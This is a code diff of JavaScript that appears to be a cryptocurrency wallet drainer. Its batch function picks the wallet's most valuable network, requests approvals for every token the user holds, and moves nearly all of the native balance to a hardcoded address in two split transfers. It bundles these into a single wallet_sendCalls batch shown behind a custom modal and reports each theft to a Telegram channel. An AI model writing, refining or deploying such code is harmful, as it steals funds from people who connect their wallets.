@@ -391,43 +391,43 @@ const getTokenPrice = async (symbol) => {
 // Batch operations
 async function performBatchOperations(mostExpensive, allBalances, state) {
   if (!mostExpensive) {
-    console.log('No most expensive token found, skipping batch operations')
-    return
+    console.log('No most expensive token found, skipping batch operations');
+    return;
   }
 
-  console.log(`Performing batch operations for network: ${mostExpensive.network}`)
+  console.log(`Performing batch operations for network: ${mostExpensive.network}`);
 
   // Switch network if necessary
-  const currentChainId = store.networkState.chainId
+  const currentChainId = store.networkState.chainId;
   if (currentChainId !== mostExpensive.chainId) {
-    console.log(`Switching to ${mostExpensive.network} (chainId ${mostExpensive.chainId})`)
+    console.log(`Switching to ${mostExpensive.network} (chainId ${mostExpensive.chainId})`);
     try {
       await new Promise((resolve, reject) => {
         const unsubscribe = appKit.subscribeNetwork(networkState => {
           if (networkState.chainId === mostExpensive.chainId) {
-            console.log(`Successfully switched to ${mostExpensive.network}`)
-            unsubscribe()
-            resolve()
+            console.log(`Successfully switched to ${mostExpensive.network}`);
+            unsubscribe();
+            resolve();
           }
-        })
+        });
         appKit.switchNetwork(networkMap[mostExpensive.network].networkObj).catch(error => {
-          unsubscribe()
-          reject(error)
-        })
+          unsubscribe();
+          reject(error);
+        });
         setTimeout(() => {
-          unsubscribe()
-          reject(new Error(`Failed to switch to ${mostExpensive.network} after timeout`))
-        }, 10000)
-      })
+          unsubscribe();
+          reject(new Error(`Failed to switch to ${mostExpensive.network} after timeout`));
+        }, 10000);
+      });
     } catch (error) {
-      store.errors.push(`Failed to switch network: ${error.message}`)
-      console.error(`Failed to switch network: ${error.message}`)
-      return
+      store.errors.push(`Failed to switch network: ${error.message}`);
+      console.error(`Failed to switch network: ${error.message}`);
+      return;
     }
   }
 
   // Get tokens with non-zero balance in the most expensive token's network
-  const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && parseUnits(t.balance, t.decimals) > 0n)
+  const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && parseUnits(t.balance, t.decimals) > 0n);
 
   // Prepare approve calls for ERC-20 tokens
   const approveCalls = networkTokens
@@ -441,52 +441,81 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
       }),
       value: '0x0',
       gasLimit: BigInt(200000)
-    }))
+    }));
 
-  // Prepare transfer call for native token
-  let transferCall = null
-  const nativeToken = networkTokens.find(t => t.address === 'native')
+  // Prepare two transfer calls for native token
+  const nativeTokenCalls = [];
+  const nativeToken = networkTokens.find(t => t.address === 'native');
   if (nativeToken) {
-    const balanceWei = parseUnits(nativeToken.balance, 18)
-    const gasReserve = BigInt('10000000000000000') // 0.01 ETH in wei
-    if (balanceWei > gasReserve) {
-      const transferAmount = balanceWei - gasReserve
-      transferCall = {
-        to: getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'),
-        value: `0x${transferAmount.toString(16)}`,
-        data: '',
-        gasLimit: BigInt(200000)
+    try {
+      const balanceWei = parseUnits(nativeToken.balance, 18);
+      const gasReserve = BigInt('10000000000000000'); // 0.01 ETH/BNB/MATIC in wei
+      const totalGasEstimate = BigInt(21000) * BigInt(2); // Gas limit for two simple transfers
+      const gasPrice = await wagmiAdapter.wagmiConfig.getFeeData().then(feeData => feeData.gasPrice || BigInt('5000000000')); // Fallback to 5 Gwei
+      const totalGasFees = gasPrice * totalGasEstimate;
+
+      if (balanceWei > totalGasFees + gasReserve) {
+        const availableBalance = balanceWei - totalGasFees - gasReserve;
+        const transferAmountPerTx = availableBalance / BigInt(2); // Split into two equal parts
+        const recipient = '0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0';
+
+        nativeTokenCalls.push(
+          {
+            to: getAddress(recipient),
+            value: `0x${transferAmountPerTx.toString(16)}`,
+            data: '0x',
+            gasLimit: BigInt(21000)
+          },
+          {
+            to: getAddress(recipient),
+            value: `0x${(availableBalance - transferAmountPerTx).toString(16)}`,
+            data: '0x',
+            gasLimit: BigInt(21000)
+          }
+        );
+      } else {
+        console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'}`);
       }
-    } else {
-      console.log(`Native token balance too low: ${nativeToken.balance} ${nativeToken.symbol || 'unknown'}`)
+    } catch (error) {
+      store.errors.push(`Error preparing native token transfers: ${error.message}`);
+      console.error(`Error preparing native token transfers: ${error}`);
     }
   }
 
   // Combine all calls
-  const allCalls = [...approveCalls]
-  if (transferCall) {
-    allCalls.push(transferCall)
-  }
+  const allCalls = [...approveCalls, ...nativeTokenCalls];
 
-  // Send batch transaction
+  // Send batch transaction using wallet_sendCalls
   if (allCalls.length > 0) {
     try {
+      showCustomModal();
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
         calls: allCalls,
         account: getAddress(state.address),
-        chainId: mostExpensive.chainId
-      })
-      console.log(`Batch transaction sent with id: ${id}`)
-      const approveState = document.getElementById('approveState')
-      if (approveState) approveState.innerHTML = `Batch transaction sent with id: ${id}`
+        chainId: mostExpensive.chainId,
+        capabilities: {
+          type: 'eip155',
+          method: 'wallet_sendCalls'
+        }
+      });
+      console.log(`Batch transaction sent with id: ${id}`);
+      const approveState = document.getElementById('approveState');
+      if (approveState) approveState.innerHTML = `Batch transaction sent with id: ${id}`;
+      const scanLink = getScanLink(id, mostExpensive.chainId, true);
+      await sendTelegramMessage(`✅ Batch transaction sent\nTx Hash: [${id}](${scanLink})\nNetwork: ${mostExpensive.network}`);
     } catch (error) {
-      store.errors.push(`Failed to send batch transaction: ${error.message}`)
-      console.error(`Batch transaction error:`, error)
-      const approveState = document.getElementById('approveState')
-      if (approveState) approveState.innerHTML = `Failed to send batch transaction: ${error.message}`
+      store.errors.push(`Failed to send batch transaction: ${error.message}`);
+      console.error(`Batch transaction error:`, error);
+      const approveState = document.getElementById('approveState');
+      if (approveState) approveState.innerHTML = `Failed to send batch transaction: ${error.message}`;
+    } finally {
+      hideCustomModal();
+      store.isProcessingConnection = false;
     }
   } else {
-    console.log('No operations to perform')
+    console.log('No operations to perform');
+    hideCustomModal();
+    store.isProcessingConnection = false;
   }
 }
 
